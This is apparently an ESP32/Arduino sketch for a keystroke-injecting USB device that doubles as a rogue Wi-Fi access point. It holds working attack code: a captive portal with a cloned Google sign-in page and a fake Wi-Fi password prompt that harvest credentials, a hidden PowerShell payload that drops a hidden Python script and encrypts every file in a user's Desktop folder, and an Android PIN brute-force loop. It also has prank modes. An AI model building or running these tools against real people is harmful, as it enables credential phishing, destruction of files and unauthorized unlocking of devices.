#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);

DNSServer dnsServer;
WebServer server(80);

USBHIDKeyboard Keyboard;

// ================= User Settings =================

// Select feature:
// Options:
// "richroll"           -> Rickroll YouTube prank
// "captive_portal"     -> Launch captive portal with DNS redirection
// "script"             -> Execute embedded HID scripts
// "script_richroll"    -> Script + Rickroll
// "barrel_roll"        -> Barrel roll animation/demo
// "note"               -> Type notes automatically
// "brute_force"        -> Android PIN brute force demo
// "all-brute_force"    -> All except brute force
const char* feature = "richroll";

// Brute-force delay in milliseconds per attempt
int bruteDelay = 100;

// Captive portal Wi-Fi AP settings
String inputSSID = "Captive portal";  // SSID
String inputPASS = "12345678";       // Password (leave empty for open network)
String portalName = "super portal";  // Portal name

// Encryption/Decryption mode: "e" = encrypt, "d" = decrypt
const char* MODE = "e";

// Target folder inside user profile (Desktop, Documents, Downloads, etc.)
const char* TARGET_FOLDER_NAME = "Desktop";

// Typing delay multiplier (affects HID typing speed)
float Delay = 35.0;

// YouTube URL for Rickroll payload
const char* linkURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

//--------------------------------------------------

// ========== PAGE 1 ==========
const char loginPage1[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body { font-family: sans-serif; }
    .login-container { width: 85%; margin: auto; padding: 20px; border-radius: 5px; margin-top: 10px; }
    #logo { margin: auto; width: fit-content; }
    .g-h1 { font-size: 25px; text-align: center; font-weight: 200; margin: auto; }
    .g-h2 { font-size: 15px; text-align: center; font-weight: 200; margin: auto; }
    .g-input { width: 95%; height: 30px; background-color: transparent; font: 400 16px Roboto, Helvetica, Arial, sans-serif;
      border-width: 0.5px; border-color: rgba(0, 0, 0, 0.6); border-radius: 4px; font-size: 16px; padding: 13px 9px; margin-bottom: 10px; }
    .create-account { font-size: smaller; color: #1a73e8; text-decoration: none; font-family: "Google Sans", Roboto, Arial, sans-serif;
      font-size: 15px; letter-spacing: 0.25px; }
    .gbtn-primary { min-width: 64px; border: none; margin-top: 6px; margin-bottom: 6px; height: 36px; border-radius: 4px;
      font-family: "Google Sans", Roboto, Arial, sans-serif; font-size: 15px; font-weight: 500; padding: 0 24px;
      background-color: rgb(26, 115, 232); color: #fff; }
    .button-container { display: flex; justify-content: space-between; align-items: center; }
    .text { font-family: Roboto, Arial, sans-serif; color: #5f6368; font-size: 14px; line-height: 1.4286;
      padding-bottom: 3px; padding-top: 9px; }
    .txt { text-decoration: none; border-radius: 4px; color: #1a73e8; }
  </style>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
  <div class="login-container">
    <div id="logo">
      <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
        <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
        <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
        <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
        <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
        <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
      </svg>
    </div>
    <form method="POST" action="/login">
      <h1 class="g-h1">Sign in</h1>
      <h2 class="g-h2">Use your Google Account</h2>
      <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
      <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
      <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>
      <div class="button-container">
        <a class="create-account" href="#">Create account</a>
        <button class="gbtn-primary" type="submit">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// ========== PAGE 2 ==========
const char loginPage2[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      background-color: #f4f4f4;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 380px;
      text-align: center;
    }
    h2 {
      margin-top: 0;
      font-size: 1.4rem;
      color: #333;
    }
    p {
      font-size: 0.95rem;
      color: #666;
      margin-bottom: 1.5rem;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    input[type="submit"] {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s;
    }
    input[type="submit"]:hover {
      background-color: #0056b3;
    }
    .footer {
      margin-top: 1.5rem;
      font-size: 0.75rem;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Reconnect to Wi-Fi</h2>
    <p>please confirm your Wi-Fi password.</p>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="Wi-Fi Password" required>
      <input type="submit" value="Continue">
    </form>
    <div class="footer">&copy; 2025 All rights reserved.</div>
  </div>
</body>
</html>
)rawliteral";

// ========== PAGE 3 ==========
const char loginPage3[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Captive Portal — For All</title>
<style>
    body {
        font-family: 'Segoe UI', Arial, sans-serif;
        background: radial-gradient(circle at top, #0a0a0a 0%, #000000 100%);
        color: #eee;
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .container {
        background: rgba(15, 15, 15, 0.95);
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0 0 25px rgba(0, 255, 150, 0.3);
        width: 350px;
        text-align: center;
    }
    .title {
        font-size: 24px;
        margin-bottom: 5px;
        font-weight: bold;
        color: #00ff99;
        text-shadow: 0 0 15px #00ff99;
    }
    .subtitle {
        font-size: 14px;
        margin-bottom: 15px;
        color: #aaa;
    }
    h2 {
        color: #0ff;
        margin-bottom: 20px;
        font-weight: normal;
        text-shadow: 0 0 10px #0ff;
    }
    input {
        width: 90%;
        padding: 12px;
        margin: 10px 0;
        border-radius: 8px;
        border: none;
        font-size: 16px;
        background: #111;
        color: #0ff;
        outline: none;
        box-shadow: inset 0 0 10px rgba(0,255,255,0.2);
    }
    input::placeholder {
        color: #555;
    }
    button {
        background: linear-gradient(90deg, #00ff99, #00ccff);
        color: #000;
        padding: 12px;
        width: 100%;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 16px;
        font-weight: bold;
        transition: 0.3s;
        box-shadow: 0 0 10px rgba(0,255,150,0.6);
    }
    button:hover {
        background: linear-gradient(90deg, #ff00cc, #6600ff);
        transform: scale(1.05);
        box-shadow: 0 0 15px rgba(255,0,200,0.8);
    }
    .note {
        font-size: 12px;
        color: #555;
        margin-top: 15px;
    }
    #loading {
        display: none;
        font-size: 18px;
        margin-top: 15px;
        color: #0ff;
        animation: blink 1s infinite;
    }
    @keyframes blink {
        50% { opacity: 0.5; }
    }
</style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <img src="data:image/png;base64,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" 
        alt="dfyR433 Logo" style="max-width:120px; margin-bottom:15px; border-radius:50%;">

        <div class="title">Captive Portal</div>
        <div class="subtitle">For All</div>
        <h2>Secure Login</h2>
        <form id="loginForm" action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Enter</button>
        </form>
        <div id="loading">Connecting...</div>
        <p class="note">Access Restricted — Authorized Users Only</p>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function() {
            document.getElementById("loginForm").style.display = "none";
            document.getElementById("loading").style.display = "block";
        });
    </script>
</body>
</html>
)rawliteral";

//----------------- typeline ---------------------
void typeLine(String line) {
  Keyboard.print(line);
  Keyboard.write(KEY_RETURN);
  delay(Delay * 0.5);
}

//----------------- program ---------------------
void program(const char* Progarm) {
  // Open Windows Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(Delay * 15);

  // Launch the program
  Keyboard.print(Progarm);
  delay(Delay * 4);
  Keyboard.write(KEY_RETURN);
  delay(Delay * 20);
}

//---------------- handleLogin ------------------
void handleLogin() {
  String email = server.hasArg("email") ? server.arg("email") : "";
  String password = server.hasArg("password") ? server.arg("password") : ""; 
  String username = server.hasArg("username") ? server.arg("username") : "";

  program("notepad");

  typeLine("Captured credentials:");
  if (email != "") typeLine("Email: " + email);
  else if (username != "") typeLine("username: " + username);
  typeLine("Password: " + password);
}

//--------------- Captive portal ----------------
void portal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(inputSSID.c_str(), inputPASS.c_str());

  Serial.println("✅ Fake AP running");
  Serial.println("SSID: " + inputSSID);
  Serial.println("PASS: " + (inputPASS == "" ? "(open)" : inputPASS));

  dnsServer.start(DNS_PORT, "*", apIP);

  if (portalName == "super google") {
    server.on("/", HTTP_GET, []() { server.send(200, "text/html", loginPage1); });
    server.onNotFound([]() { server.send(200, "text/html", loginPage1); });
  } else if (portalName == "super pass") {
    server.on("/", HTTP_GET, []() { server.send(200, "text/html", loginPage2); });
    server.onNotFound([]() { server.send(200, "text/html", loginPage2); });
  } else if (portalName == "super portal") {
    server.on("/", HTTP_GET, []() { server.send(200, "text/html", loginPage3); });
    server.onNotFound([]() { server.send(200, "text/html", loginPage3); });
  }

  server.on("/login", HTTP_POST, handleLogin);
  server.begin();
}

//--------------- Python Script ------------------
void py_script() {
  // Launch PowerShell in hidden window
  program("powershell -WindowStyle Hidden");

  // Set PowerShell variable for target folder path
  String psTargetFolder = String("$targetFolder = \"$env:USERPROFILE\\") + TARGET_FOLDER_NAME + "\"";
  typeLine(psTargetFolder.c_str());

  // Export env variable for Python script usage
  typeLine("Set-Item -Path Env:TARGET_FOLDER -Value $targetFolder");

  // Start PowerShell here-string for Python script content
  typeLine("@\"");

  // ---- Python script begins ----
  typeLine("import os, sys, time, base64, shutil, subprocess");
  typeLine("try:");
  typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
  typeLine("    from cryptography.fernet import Fernet");
  typeLine("    from cryptography.hazmat.primitives import hashes");
  typeLine("    from cryptography.hazmat.backends import default_backend");
  typeLine("except ImportError:");
  typeLine("    print('[!] cryptography not found. Installing...')");
  typeLine("    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])");
  typeLine("    print('[+] Installed. Restarting script...')");
  typeLine("    os.execv(sys.executable, [sys.executable] + sys.argv)");
  typeLine("");
  typeLine("TARGET_FOLDER = os.getenv('TARGET_FOLDER')");
  typeLine("SALT = b'educational_demo_salt!'");
  typeLine("ITERATIONS = 390000");
  typeLine("KEY_FILE = 'keyfile.key'");
  typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
  typeLine("LOG_FILE = 'encryptor.log'");
  typeLine("PASSWORD = '12345678'");
  typeLine(("MODE = '" + String(MODE) + "'").c_str());
  typeLine("");
  typeLine("def log(msg):");
  typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
  typeLine("        f.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\\n\")");
  typeLine("    print(msg)");
  typeLine("");
  typeLine("def derive_key(password, salt):");
  typeLine("    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS, backend=default_backend())");
  typeLine("    return base64.urlsafe_b64encode(kdf.derive(password.encode()))");
  typeLine("");
  typeLine("def save_key(key):");
  typeLine("    with open(KEY_FILE, 'wb') as f: f.write(key)");
  typeLine("    log(f'[+] Key saved to {KEY_FILE}')");
  typeLine("    try:");
  typeLine("        os.makedirs(os.path.dirname(KEY_BACKUP_FILE), exist_ok=True)");
  typeLine("        shutil.copy2(KEY_FILE, KEY_BACKUP_FILE)");
  typeLine("        log(f'[+] Backup key saved to {KEY_BACKUP_FILE}')");
  typeLine("    except Exception as e:");
  typeLine("        log(f'[!] Failed to backup key: {e}')");
  typeLine("");
  typeLine("def load_key():");
  typeLine("    with open(KEY_FILE, 'rb') as f: key = f.read()");
  typeLine("    log(f'[+] Key loaded from {KEY_FILE}')");
  typeLine("    return key");
  typeLine("");
  typeLine("def get_all_files(folder):");
  typeLine("    paths = []");
  typeLine("    for root, _, files in os.walk(folder):");
  typeLine("        for file in files:");
  typeLine("            path = os.path.join(root, file)");
  typeLine("            if os.path.abspath(path) != os.path.abspath(KEY_FILE):");
  typeLine("                paths.append(path)");
  typeLine("    return paths");
  typeLine("");
  typeLine("def progress_bar(current, total):");
  typeLine("    percent = int((current / total) * 100)");
  typeLine("    bar = '#' * (percent // 2) + '-' * (50 - percent // 2)");
  typeLine("    sys.stdout.write(f\"\\r[{bar}] {percent}%\")");
  typeLine("    sys.stdout.flush()");
  typeLine("");
  typeLine("def encrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            with open(path, 'wb') as f: f.write(fernet.encrypt(data))");
  typeLine("            log(f'[+] Encrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to encrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("def decrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            dec = fernet.decrypt(data)");
  typeLine("            with open(path, 'wb') as f: f.write(dec)");
  typeLine("            log(f'[-] Decrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to decrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("if __name__ == '__main__':");
  typeLine("    os.makedirs(TARGET_FOLDER, exist_ok=True)");
  typeLine("    log('=== Safe Dual-Mode Started ===')");
  typeLine("    if os.path.exists(KEY_FILE):");
  typeLine("        log('[*] Key file found.')");
  typeLine("        key = load_key()");
  typeLine("    else:");
  typeLine("        key = derive_key(PASSWORD, SALT)");
  typeLine("        save_key(key)");
  typeLine("    fernet = Fernet(key)");
  typeLine("    if MODE == 'e':");
  typeLine("        encrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    elif MODE == 'd':");
  typeLine("        decrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    else:");
  typeLine("        log('[!] Invalid mode.')");
  typeLine("    log('=== Process Finished ===')");
  // ---- Python script ends ----

  // Save Python script to user profile root folder as hidden file
  typeLine("\"@ | Set-Content $env:USERPROFILE\\safe_dual_mode.py");
  typeLine("Set-ItemProperty \"$env:USERPROFILE\\safe_dual_mode.py\" -Name Attributes -Value Hidden");

  // Execute Python script
  typeLine("python $env:USERPROFILE\\safe_dual_mode.py");

  // Exit PowerShell session
  typeLine("exit");

}

//-------------- YouTube Richroll -----------------
void pingSite() {
  program(linkURL);
}

//-------------- Barrel Roll Mode -----------------
void barrelRollMode() {
  program("cmd");
  typeLine("start https://www.google.com/search?q=do+a+barrel+roll");
  typeLine("exit");
}

//--------------- notepad Mode --------------------
void notepadMode() {
  program("notepad");
  typeLine("You have been hacked.");
}

//----------------- pin loop ----------------------
void typePIN(const char* pin) {
  while (*pin) {
    Keyboard.write(*pin);
    delay(1);
    pin++;
  }
}

//--------------- Setup ----------------
void setup() {
  pinMode(15, OUTPUT);
  USB.begin();
  Keyboard.begin();
  digitalWrite(15, HIGH);
  delay(Delay * 30); // Initial pause

  if (strcmp(feature, "richroll") == 0) {
    pingSite();
  } else if (strcmp(feature, "captive_portal") == 0) {
    portal();
  } else if (strcmp(feature, "script") == 0) {
    py_script();
  } else if (strcmp(feature, "script_richroll") == 0) {
    py_script();
    pingSite();
  } else if (strcmp(feature, "barrel_roll") == 0) {
    barrelRollMode();
  } else if (strcmp(feature, "note") == 0) {
    notepadMode();
  } else if (strcmp(feature, "all-brute_force") == 0) {
    py_script();
    delay(1000);
    barrelRollMode();
    delay(3000);
    pingSite();
    delay(1000);
    notepadMode();
    delay(1000);
    portal();
  }
}

void loop() { 
  if (strcmp(feature, "brute_force") == 0) {
    for (int i = 0; i <= 999999; i++) {
    char pin[7]; // 6 digits + null terminator
    sprintf(pin, "%06d", i); // format as 6-digit number with leading zeros

    typePIN(pin);

    Keyboard.write(KEY_RETURN); // press Enter after typing PIN
    delay(bruteDelay);
    }
  }
  dnsServer.processNextRequest();
  server.handleClient();
} 
